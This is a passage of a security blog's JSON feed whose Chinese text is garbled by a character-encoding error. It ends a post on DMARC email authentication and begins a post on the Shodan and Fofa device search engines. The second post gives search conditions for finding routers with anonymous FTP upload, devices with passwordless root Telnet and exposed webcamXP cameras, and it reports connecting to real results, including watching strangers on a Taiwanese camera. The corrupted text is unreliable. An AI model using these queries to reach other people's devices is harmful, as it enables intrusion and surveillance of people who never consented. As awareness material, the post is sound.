é©—è­‰å¤±æ•—çš„ä¿¡ä¸€å¾‹å›çµ•æˆ–ç›´æ¥æ¨æ£„</li>\n<li><code>quarantine</code>ï¼šéš”é›¢ï¼Œå¯¦éš›è™•ç†æ–¹æ³•å›  email server è€Œç•°ï¼Œå¯èƒ½æ˜¯æ”¾åœ¨ email server ä¸Šçš„éš”é›¢å€åŸŸç­‰å¾…è¦–å¯Ÿï¼ˆä¾‹å¦‚å¾®è»Ÿçš„ email server æœ‰ quarantine centerï¼‰ï¼Œæˆ–æ˜¯è¢«æ­¸é¡åˆ°åƒåœ¾éƒµä»¶ä¸­ä¸¦åŠ è¨»è­¦æˆ’æ¨™ç±¤ï¼ˆä¾‹å¦‚ gmail çš„è™•ç†æ–¹å¼ï¼‰ã€‚</li>\n<li><code>none</code>ï¼šæœ€å¯¬é¬†çš„è¨­å®šï¼Œè¡¨ç¤ºä¸åšç‰¹åˆ¥è™•ç†ï¼Œåƒ…æ˜¯è§€å¯Ÿï¼ˆmonitorï¼‰ï¼Œå¯¦éš›è™•ç†æ–¹æ³•å›  email server è€Œç•°ï¼Œæœ‰å¯èƒ½é€²å…¥ä¸€èˆ¬ä¿¡ç®±ä¹Ÿå¯èƒ½æ­¸é¡åˆ°åƒåœ¾éƒµä»¶ã€‚</li>\n</ul>\n<p>è€Œå®šç¾© alignment çš„æ¨™ç±¤ç‚º <code>aspf</code> èˆ‡ <code>adkim</code>ï¼Œåˆ†åˆ¥å°æ‡‰ SPF èˆ‡ DKIMã€‚ä»¥ SPF ä¾†èªªæ˜¯æ¯”å° <code>header.From</code> çš„ç¶²åŸŸèˆ‡ <code>smtp.MailFrom</code> çš„ç¶²åŸŸï¼›ä»¥ DKIM ä¾†èªªæ˜¯æ¯”å° <code>header.From</code> èˆ‡ DKIM signature ä¸­ <code>d</code> æ¨™ç±¤çš„ç¶²åŸŸï¼ˆä¾‹å¦‚å‰é¢åœ–ä¸­è—è‰²å­—é«”çš„ <a href=\"http://example.net\">example.net</a>ï¼‰ã€‚</p>\n<p>å¯èƒ½çš„å€¼æœ‰ï¼š</p>\n<ul>\n<li><code>s</code>ï¼ˆstrictï¼‰ï¼šåš´æ ¼æª¢æŸ¥ï¼Œæ¯”å°çš„å…©å€‹ç¶²åŸŸå¿…é ˆå®Œå…¨</li>\n<li><code>r</code>ï¼ˆrelaxedï¼‰ï¼šå¯¬é¬†æª¢æŸ¥ï¼Œæ¯”å°çš„å…©å€‹ç¶²åŸŸåªè¦ base domain ç›¸åŒå³å¯ï¼Œäº¦å³å¯ç‚ºä¸»ç¶²åŸŸèˆ‡å­ç¶²åŸŸçš„é—œä¿‚</li>\n</ul>\n<p>DMARC ç”šè‡³å¾ˆè²¼å¿ƒçš„é™„è´ˆå›å ±åŠŸèƒ½ï¼Œä½ å¯ä»¥åœ¨ DMARC ç´€éŒ„æŒ‡å®šä¿¡ç®±ï¼Œå‰‡æ”¶ä¿¡æ–¹çš„ email server æœƒæ¯å¤©æ•´ç†ä¸¦å¯„é€ä¸€ä»½å ±å‘Šåˆ°é€™å€‹ä¿¡ç®±ï¼Œå‘Šè¨´ä½ æ˜¨å¤©ä¿¡ä»¶é©—è­‰çš„ç‹€æ³ï¼ŒåŒ…å«é©—è­‰å¤±æ•—çš„ä¿¡çš„ trace è³‡è¨Šèˆ‡é©—è­‰çµæœã€‚</p>\n<p>ä½ ä¹Ÿå¯ä»¥åœ¨æ¯ä¸€å°ä¿¡çš„åŸå§‹è³‡è¨Šä¸­çœ‹è¦‹é©—è­‰çµæœï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dmarc-result.png\" /><figcaption><p>DMARC é©—è­‰çµæœ</p>\n</figcaption></figure></p>\n<p>å¦‚æœä»Šå¤© <a href=\"http://gmail.com\">gmail.com</a> è¨­ç½®äº† SPFã€DKIMã€DMARC ç´€éŒ„ï¼Œé‚£çˆºçˆºçš„ email server åœ¨é©—è­‰æ™‚å°±æœƒç™¼ç¾é›–ç„¶è¡¨å¼Ÿçš„ SPFã€DKIM é©—è­‰é€šéäº†ï¼Œä½†æ˜¯<code>header.From</code>å¯«çš„ <a href=\"http://gmail.com\">gmail.com</a> è·Ÿ<code>smtp.MailFrom</code>é‚„æœ‰ DKIM signature ä¸­ <code>d</code> æ¨™ç±¤å¯«çš„ <a href=\"http://cousin.com\">cousin.com</a> å°ä¸èµ·ä¾†ï¼Œå› æ­¤åˆ¤æ–·ç‚ºé©—è­‰å¤±æ•—ï¼Œçˆºçˆºå› æ­¤åˆå¹³å®‰åº¦éäº†ä¸€å¤©ï¼</p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h2>\n<p>è®€åˆ°é€™è£¡ï¼Œå¤§å®¶æ˜¯å¦æ›´åŠ äº†è§£å° email security æœ‰å“ªäº›å¨è„…èˆ‡é˜²è­·æ©Ÿåˆ¶äº†å‘¢ï¼Ÿæˆ‘å€‘å¾ä¸€å°éƒµä»¶çš„æ—…ç¨‹ä»‹ç´¹å‚³è¼¸éç¨‹ä¸­çš„å„ç¨®è§’è‰²èˆ‡è·è²¬ï¼Œä¹Ÿé€éä¸‰å€‹æƒ…å¢ƒè®“å¤§å®¶èªè­˜ SPFã€DKIMã€DMARC é€™äº›é˜²è­·çš„ç”¨æ„èˆ‡æ•ˆæœã€‚æœ‰äº†é€™ä¸‰åŠå®¢ï¼Œæˆ‘å€‘å°±ä¸ç”¨æ“”å¿ƒä¿¡ä»¶è¢«ç¯¡æ”¹ã€ä»¿é€ ã€æˆ–æ˜¯å¾æœªç¶“æˆæ¬Šçš„åœ°æ–¹å¯„å‡ºäº†ã€‚è¿‘ä¾† email security æ„è­˜æŠ¬é ­ï¼ŒDMARC ä¹Ÿååˆ— Gartner åå¤§è³‡å®‰ä¸»é¡Œæ’è¡Œæ¦œå–”ï¼</p>\n<p>ä¸éå…¶å¯¦é€™äº›æ©Ÿåˆ¶é‚„æœ‰å¾ˆå¤šä¸è¶³çš„åœ°æ–¹ï¼Œä¾‹å¦‚ï¼šä¸­ç¹¼ email server æ˜¯å¯ä»¥å†’å……çš„å—ï¼Ÿæ˜¯èª°æ§åˆ¶çš„ï¼Ÿå¦‚æœ <code>smtp.MailFrom</code> è·Ÿ <code>header.From</code> ä¸åŒçš„æ™‚å€™ï¼ˆä¾‹å¦‚åˆç†ä½¿ç”¨ forwarding åŠŸèƒ½ï¼‰ä¸å°±å®Œè›‹äº†å—ï¼Ÿåœ¨æ²’æœ‰é€™äº›æ©Ÿåˆ¶ä»¥å‰æ˜¯å¦‚ä½•é˜²æ²»é‡£é­šçš„ï¼›æœ‰äº†ä¸‰åŠå®¢ä»¥å¾Œé‚„æœ‰å“ªäº›æ©Ÿåˆ¶å¯ä»¥è£œå¼·å‘¢ï¼Ÿ</p>\n<p>é€™äº›è€äººå°‹å‘³çš„å•é¡Œï¼Œæˆ‘å€‘ç•™å¾…ä¹‹å¾Œæ›´æ·±å…¥æ¢è¨ã€‚ä¸‹ä¸€ç¯‡ï¼Œæˆ‘å€‘å…ˆä¾†çœ‹çœ‹ä¸‰åŠå®¢åˆ°åº•å¦‚ä½•è¨­ç½®ï¼Œä»¥åŠæœ‰å“ªäº›å®¹æ˜“å‡ºéŒ¯çš„å°åœ°æ–¹ï½</p>\n<p>é™„å¸¶ä¸€æï¼Œç‚ºäº†è®“ä½¿ç”¨è€…å¯ä»¥æ›´è¼•æ˜“çš„å¾å¯„ä¿¡äººçš„é ­è²¼è¾¨è­˜å‡ºæ˜¯ä¸æ˜¯ã€æ­£èº«ã€ï¼Œæœ‰å¦ä¸€å€‹å«åš BIMI çš„æ©Ÿåˆ¶æ˜¯ç”¨ä¾†é©—è­‰é ­è²¼çš„å“¦ï¼ä¸éç›®å‰ BIMI é‚„ä¸æ˜¯å¾ˆæ™®åŠï¼Œæœ‰èˆˆè¶£çš„æœ‹å‹å¯ä»¥å†å»äº†è§£ã€‚</p>\n<h3 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h3>\n<ol>\n<li><a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail Architecture</a></li>\n<li><a href=\"https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc\">Mail terminology</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376#section-5\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n<li><a href=\"https://dmarc.org/\">DMARC.org</a></li>\n<li><a href=\"https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/\">Gartner</a></li>\n</ol>\n",
      "date_published": "2021-07-02T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/shodan-fofa/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/shodan-fofa/",
      "title": "é§­å®¢èµ·æ‰‹å¼ : Shodan &amp; Fofa",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<p>è™•æ–¼è³‡è¨Šçˆ†ç‚¸æ™‚ä»£ï¼Œé‡åˆ°å•é¡Œçš„ç¬¬ä¸€æ­¥é€šå¸¸å°±æ˜¯å» Google ä¸€ä¸‹ï¼Œé§­å®¢å€‘ç•¶ç„¶ä¹Ÿæ˜¯é€™æ¨£æƒ³ï¼Œä¸éé™¤äº† Google Hacking ä»¥å¤–é§­å®¢æœ‰æ›´å°ˆé–€çš„æœå°‹å¼•æ“ã€‚</p>\n<p>æœ¬æ–‡æœƒå…ˆç°¡å–®ä»‹ç´¹ä¸€ä¸‹é§­å®¢å¸¸ç”¨çš„æœå°‹å¼•æ“ï¼Œé‡é»å‰‡æ”¾åœ¨å¯¦éš›æ¡ˆä¾‹èªªæ˜èˆ‡åˆ†äº«ï¼Œçœ‹ä¸€ä¸‹å…è²»ç”¨æˆ¶å¯ä»¥åšåˆ°ä»€éº¼ç¨‹åº¦çš„æ”»æ“Šï¼Œæœ€å¾Œè¨è«–ä¸€ä¸‹å¦‚ä½•é¿å…è¢«æ‰¾åˆ°ï¼Œæ‰“ä¸éé§­å®¢é›£é“é‚„èº²ä¸èµ·Â ?</p>\n<h2 id=\"%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\"><a class=\"direct-link\" href=\"#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\">#</a> å·¥å…·ä»‹ç´¹</h2>\n<p>æåˆ°é§­å®¢æœå°‹å¼•æ“ï¼Œæœ‰è³‡å®‰èƒŒæ™¯çš„æœ‹å‹ç¬¬ä¸€å€‹æœƒæƒ³åˆ°çš„å°±æ˜¯å¤§åé¼é¼çš„ Shodanï¼Œä½†æœ¬æ–‡é™¤äº†ä»‹ç´¹è€ç‰Œçš„ Shodan ä¹‹å¤–é‚„è¦ä»‹ç´¹å¦ä¸€å€‹å¾Œèµ·ä¹‹ç§€ Fofaï¼Œå°±åƒæˆ‘å€‘è¦ºå¾— IE æˆ– Safari ä¸é †æ‰‹çš„æ™‚å€™å°±æœƒæ”¹ç”¨ Chrome æˆ– Firefoxä¸€æ¨£ï¼Œé§­å®¢ä¹Ÿæœƒå˜—è©¦ç”¨ä¸åŒçš„æ–¹æ³•ä¾†æ‰¾åˆ°æ”»æ“Šç›®æ¨™ã€‚</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__gX36EdhP1jdHBn6tWpMG7g.png\" alt=\"\"></p>\n<h3 id=\"1.-%E7%B0%A1%E4%BB%8B\"><a class=\"direct-link\" href=\"#1.-%E7%B0%A1%E4%BB%8B\">#</a> 1. ç°¡ä»‹</h3>\n<p>Shodan æ˜¯è¯ç¶²è£ç½®çš„æœå°‹å¼•æ“ï¼Œå¾ç¶²ç«™ä¸»æ©Ÿåˆ°å„ç¨® IOT è¨­å‚™éƒ½å¯ä»¥åœ¨ä¸Šé¢æ‰¾åˆ°ï¼ŒèƒŒå¾Œæœ‰ç„¡æ•¸å°çˆ¬èŸ²ä¼ºæœå™¨ 24 å°æ™‚åœ¨æ”¶é›†å…¨ä¸–ç•Œçš„è³‡æ–™ï¼Œé›–ç„¶é€™å€‹ç¶²ç«™çš„åˆè¡·æ˜¯è®“ä½¿ç”¨è€…æª¢æŸ¥è‡ªå·±çš„è¨­å‚™æˆ–æœå‹™æ˜¯å¦æš´éœ²åœ¨å¤–ç¶²ï¼Œä½†é§­å®¢å€‘åˆ©ç”¨æœå°‹è¦å‰‡å¾ Shodan çš„è³‡æ–™åº«ä¸­å¿«é€Ÿæ‰¾å‡ºæœ‰å¼±é»çš„è¨­å‚™ä¸¦æ”»æ“Šï¼Œæ”»æ“Šèƒ½å½±éŸ¿ç¯„åœç›´æ¥æå‡åˆ°äº†ä¸–ç•Œç´šï¼Œæ‰€ä»¥ç¨± Shodan ç‚ºæœ€å±éšªçš„æœå°‹å¼•æ“ä¸€é»ä¹Ÿä¸éåˆ†ã€‚</p>\n<h3 id=\"2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A\"><a class=\"direct-link\" href=\"#2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A\">#</a> 2. æœå°‹è¦å‰‡Â :</h3>\n<p>è¦å‰‡åˆ†ç‚º 10 å¤§é¡ï¼Œæœ€å¸¸ç”¨çš„æ˜¯ Generalï¼Œå…¶ä»–é¡åˆ¥æ˜¯é‡å°ç‰¹å®šé ˜åŸŸçš„æœå°‹ï¼Œè€Œä¸”æœ‰äº›éœ€è¦ä»˜è²»æœƒå“¡æ‰å¯ä½¿ç”¨ï¼Œå¾Œé¢æœƒèˆ‰ä¸€äº›å¯¦éš›æ‡‰ç”¨çš„ä¾‹å­ã€‚</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__q9RtyVHUj4IJ4uivxn5NNw.png\" alt=\"\"></p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__xrdSmu1pLtoImh3Ab____fCg.png\" alt=\"\"></p>\n<h3 id=\"1.-%E7%B0%A1%E4%BB%8B-%3A\"><a class=\"direct-link\" href=\"#1.-%E7%B0%A1%E4%BB%8B-%3A\">#</a> 1. ç°¡ä»‹Â :</h3>\n<p>Fofa æ˜¯ä¸­åœ‹è³‡å®‰å» å•†ç™½å¸½åŒ¯æ¨å‡ºçš„æœå°‹å¼•æ“ï¼Œæ“æœ‰ä¸éœæ–¼ Shodan çš„é¾å¤§è³‡æ–™åº«ï¼Œèƒ½å¤ å¿«é€Ÿé€²è¡Œè¯ç¶²è£ç½®åŒ¹é…ï¼Œé€²è¡Œæ¼æ´å½±éŸ¿ç¯„åœåˆ†æã€æ‡‰ç”¨åˆ†ä½ˆçµ±è¨ˆã€æ‡‰ç”¨æµè¡Œåº¦ç­‰ã€‚</p>\n<h3 id=\"2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A-2\"><a class=\"direct-link\" href=\"#2.-%E6%90%9C%E5%B0%8B%E8%A6%8F%E5%89%87-%3A-2\">#</a> 2. æœå°‹è¦å‰‡Â :</h3>\n<p>é€™é‚Šç‚ºäº†æ–¹ä¾¿ä¹‹å¾Œé€²è¡Œæ¯”è¼ƒï¼Œç”¨äº†é¡ä¼¼ Shodan çš„æ–¹å¼ä¾†å°‡ Fofa çš„è¦å‰‡åˆ†é¡ï¼Œä¹Ÿå¯çœ‹å‡º Fofa å°‡é‡é»æ”¾åœ¨ç¶²ç«™ç›¸é—œçš„æœå°‹ï¼Œè€Œä¸”å¤šäº†ä¸€äº›åˆ†æç”¨çš„è¦å‰‡ï¼Œåƒæ˜¯æ™‚é–“é™åˆ¶ã€æ•¸é‡çµ±è¨ˆç­‰ï¼Œä¸€æ¨£æœ‰éƒ¨åˆ†è¦å‰‡ä»˜è²»ç”¨æˆ¶æ‰èƒ½ä½¿ç”¨ã€‚</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__zlEjdhzf6j30K4MS1PqQLA.png\" alt=\"\"></p>\n<h2 id=\"%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BE%8B%E5%88%86%E4%BA%AB\">#</a> å¯¦ä¾‹åˆ†äº«</h2>\n<p>é€™é‚Šæœƒå…ˆåˆ†äº«å¹¾ç¨®çœŸå¯¦çš„æ”»æ“Šæ¡ˆä¾‹ï¼Œè®“å¤§å®¶é«”é©—ä¸€ä¸‹ç•¶é§­å®¢çš„æ„Ÿè¦ºï¼ŒåŒæ™‚æ¯”è¼ƒä¸€ä¸‹å…©ç¨®å·¥å…·æ‰¾åˆ°çš„çµæœæ•¸é‡ï¼Œç„¶å¾Œå†åˆ†äº«å¹¾ç¨®å„å·¥å…·ç‰¹æœ‰çš„æŸ¥è©¢æ¡ˆä¾‹ï¼Œè«‹æ³¨æ„éç¨‹ä¸­è«‹é¿å…è“„æ„ç ´å£ï¼Œé€ æˆçš„å½±éŸ¿ä¸€å¾‹è‡ªè¡Œæ‰¿æ“”ã€‚</p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-1-%3A-%E6%AA%94%E6%A1%88%E5%88%86%E4%BA%AB%E4%BC%BA%E6%9C%8D%E5%99%A8-(ftp)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-1-%3A-%E6%AA%94%E6%A1%88%E5%88%86%E4%BA%AB%E4%BC%BA%E6%9C%8D%E5%99%A8-(ftp)\">#</a> æ¡ˆä¾‹ 1 : æª”æ¡ˆåˆ†äº«ä¼ºæœå™¨Â (FTP)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A\">#</a> é§­å®¢Â :</h4>\n<p>ç¡¬ç¢Ÿç©ºé–“ä¸å¤ äº†ï¼Œæ‹¿åˆ¥äººçš„ä¾†é ‚ä¸€ä¸‹ï¼Œé †ä¾¿ä¸Ÿå€‹å¾Œé–€ä¸Šå»ã€‚</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A\">#</a> èªªæ˜Â :</h4>\n<p>ASUS å‹è™Ÿç‚º RT-AC66U çš„è·¯ç”±å™¨æœ‰æ”¯æ´ FTP Server çš„åŠŸèƒ½ï¼Œå•é¡Œå‡ºåœ¨æ–¼è©² è¨­å‚™é–‹æ”¾åŒ¿åç™»å…¥ï¼Œè€Œä¸”åŒ¿åä½¿ç”¨è€…ç«Ÿç„¶æœ‰ä¸Šå‚³èˆ‡ä¸‹è¼‰çš„æ¬Šé™ï¼Œæ‰€ä»¥åªè¦æ‰¾åˆ°å¾Œèª°éƒ½å¯ä»¥ä½¿ç”¨ï¼Œé§­å®¢é‚„å¯ä»¥è—‰æ­¤æ‰“é€²å…§ç¶²ï¼Œæ”»æ“Šæœ‰é€£åˆ°è©²å°è·¯ç”±å™¨ä¸Šçš„è¨­å‚™ã€‚</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A\">#</a> æœå°‹æ¢ä»¶Â :</h4>\n<ol>\n<li>PortÂ : 21</li>\n<li>å›æ‡‰å…§å®¹åŒ…å«Â : RT-AC66R</li>\n<li>å›æ‡‰å…§å®¹æ’é™¤Â : 530 (æ’é™¤ç¦ç”¨åŒ¿åç™»å…¥çš„è¨­å‚™)</li>\n</ol>\n<h4 id=\"shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> ShodanÂ : 11 ç­†çµæœ</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__2CX2MOE5o2IXsXP9D__R__aA.png\" alt=\"\"></p>\n<h4 id=\"fofa-%3A-33-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#fofa-%3A-33-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> FofaÂ : 33 ç­†çµæœ</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__KOu4aEsUhDrMC43U6C4Zww.png\" alt=\"\"></p>\n<h4 id=\"%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-shodan-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-ftp-server\"><a class=\"direct-link\" href=\"#%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-shodan-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-ftp-server\">#</a> é©—è­‰Â : é€£æ¥åˆ° Shodan æœç´¢çµæœä¸­çš„ FTP Server</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__fn__pwtV47j3h44FFR__v47Q.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-2-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(telnet)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-2-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(telnet)\">#</a> æ¡ˆä¾‹ 2Â : é ç«¯æ§åˆ¶Â (Telnet)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-2\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-2\">#</a> é§­å®¢Â :</h4>\n<p>ç”¨è‡ªå·±çš„é›»è…¦å¹¹å¤§äº‹æ€•è¢«ç™¼ç¾ï¼Œé‚£ç”¨åˆ¥äººçš„ä¸å°±å¥½äº†ã€‚</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-2\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-2\">#</a> èªªæ˜Â :</h4>\n<p>æœ‰å°å‹è™Ÿ p750(æ²’æŸ¥å‡ºæ˜¯èª°å®¶çš„)çš„è¨­å‚™é–‹å•Ÿäº† Telnet Serverï¼Œç™»å…¥ä¸éœ€è¦å¸³å¯†è€Œä¸”ä¸€é€²å»å°±æœ‰ Root æ¬Šé™ï¼Œå°é§­å®¢ä¾†èªªæ ¹æœ¬æ˜¯é€åˆ†é¡Œã€‚</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-2\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-2\">#</a> æœå°‹æ¢ä»¶Â :</h4>\n<ol>\n<li>PortÂ : 23</li>\n<li>å›æ‡‰å…§å®¹åŒ…å«Â : p750</li>\n<li>å›æ‡‰å…§å®¹åŒ…å«Â : root@</li>\n</ol>\n<h4 id=\"shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C-2\"><a class=\"direct-link\" href=\"#shodan-%3A-11-%E7%AD%86%E7%B5%90%E6%9E%9C-2\">#</a> ShodanÂ : 11 ç­†çµæœ</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__SO9q00Z9x5c1FI__IgBS7ng.png\" alt=\"\"></p>\n<h4 id=\"fofa-%3A-89-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#fofa-%3A-89-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> FofaÂ : 89 ç­†çµæœ</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__NGGLiD__gKlvmcKbLktDl4w.png\" alt=\"\"></p>\n<h4 id=\"%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-fofa-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-telnet-server\"><a class=\"direct-link\" href=\"#%E9%A9%97%E8%AD%89-%3A-%E9%80%A3%E6%8E%A5%E5%88%B0-fofa-%E6%90%9C%E7%B4%A2%E7%B5%90%E6%9E%9C%E4%B8%AD%E7%9A%84-telnet-server\">#</a> é©—è­‰Â : é€£æ¥åˆ° Fofa æœç´¢çµæœä¸­çš„ Telnet Server</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__myf23vGvuE0YRKFXRs3EFA.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-3-%3A-%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-3-%3A-%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\">#</a> æ¡ˆä¾‹ 3Â :Â ç¶²è·¯æ”å½±æ©Ÿ</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-3\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-3\">#</a> é§­å®¢Â :</h4>\n<p>æˆ‘ç„¡èŠæƒ³çœ‹çœ‹åˆ¥äººåœ¨å¹¹å˜›ã€‚</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-3\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-3\">#</a> èªªæ˜Â :</h4>\n<p>webcamXP æ˜¯æ•´åˆäº† HTTP ç¶²é ä¼ºæœå™¨åŠŸèƒ½çš„ WebCam ç¶²è·¯æ”å½±æ©Ÿä¼ºæœå™¨è»Ÿé«”ï¼Œè—‰ç”±å®ƒï¼Œæ‚¨å¯ä»¥å°‡ç¶²è·¯æ”å½±æ©Ÿæ‰€æ‹æ”çš„å…§å®¹å³æ™‚åˆ†äº«çµ¦ç¶²è·¯ä¸Šçš„ä»»ä½•äººï¼ŒåŒ…å«é§­å®¢ï¼Œå¦å¤–é€™é¡å‹çš„æœå°‹åŠ ä¸Šåœ°å€æ¢ä»¶æ™‚æœƒæœ‰å¥‡æ•ˆã€‚</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-3\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-3\">#</a> æœå°‹æ¢ä»¶Â :</h4>\n<ol>\n<li>ServerÂ : webcamXP 5</li>\n<li>å›æ‡‰å…§å®¹ä¸åŒ…å«Â : 360 (æ’é™¤ honeypot(è¨»1) ä¸­çš„å›æ‡‰å…§å®¹)</li>\n</ol>\n<h4 id=\"shodan-%3A-239-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#shodan-%3A-239-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> ShodanÂ : 239 ç­†çµæœ</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__lLn3bhqi4v4wl20CHRHw__g.png\" alt=\"\"></p>\n<h4 id=\"fofa-%3A-1718-%E7%AD%86%E7%B5%90%E6%9E%9C-(950%E5%80%8B%E8%A8%AD%E5%82%99)\"><a class=\"direct-link\" href=\"#fofa-%3A-1718-%E7%AD%86%E7%B5%90%E6%9E%9C-(950%E5%80%8B%E8%A8%AD%E5%82%99)\">#</a> FofaÂ : 1718 ç­†çµæœ (950å€‹è¨­å‚™)</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__HwqfAOCXyAhnA83xUkUSeQ.png\" alt=\"\"></p>\n<h4 id=\"%E9%A9%97%E8%AD%89-%3A-%E5%BE%9E-fofa-%E7%9A%84%E7%B5%90%E6%9E%9C%E4%B8%AD%E6%89%BE%E4%B8%80%E5%80%8B%E5%8F%B0%E7%81%A3%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\"><a class=\"direct-link\" href=\"#%E9%A9%97%E8%AD%89-%3A-%E5%BE%9E-fofa-%E7%9A%84%E7%B5%90%E6%9E%9C%E4%B8%AD%E6%89%BE%E4%B8%80%E5%80%8B%E5%8F%B0%E7%81%A3%E7%9A%84%E7%B6%B2%E8%B7%AF%E6%94%9D%E5%BD%B1%E6%A9%9F\">#</a> é©—è­‰Â : å¾ Fofa çš„çµæœä¸­æ‰¾ä¸€å€‹å°ç£çš„ç¶²è·¯æ”å½±æ©Ÿ</h4>\n<p>(åœ¨é˜²ç–«æ™‚æœŸå¾Œé¢çš„æœ‹å‹åˆ°ç¢§æ½­ç©é‚„ä¸æˆ´å£ç½©ï¼ŒI got youÂ !)</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__8ESIlmgyrF5ijsMHOO76kA.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-4-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-4-%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\">#</a> æ¡ˆä¾‹ 4Â : é ç«¯æ§åˆ¶ (WindowsÂ RDP)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-4\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-4\">#</a> é§­å®¢Â 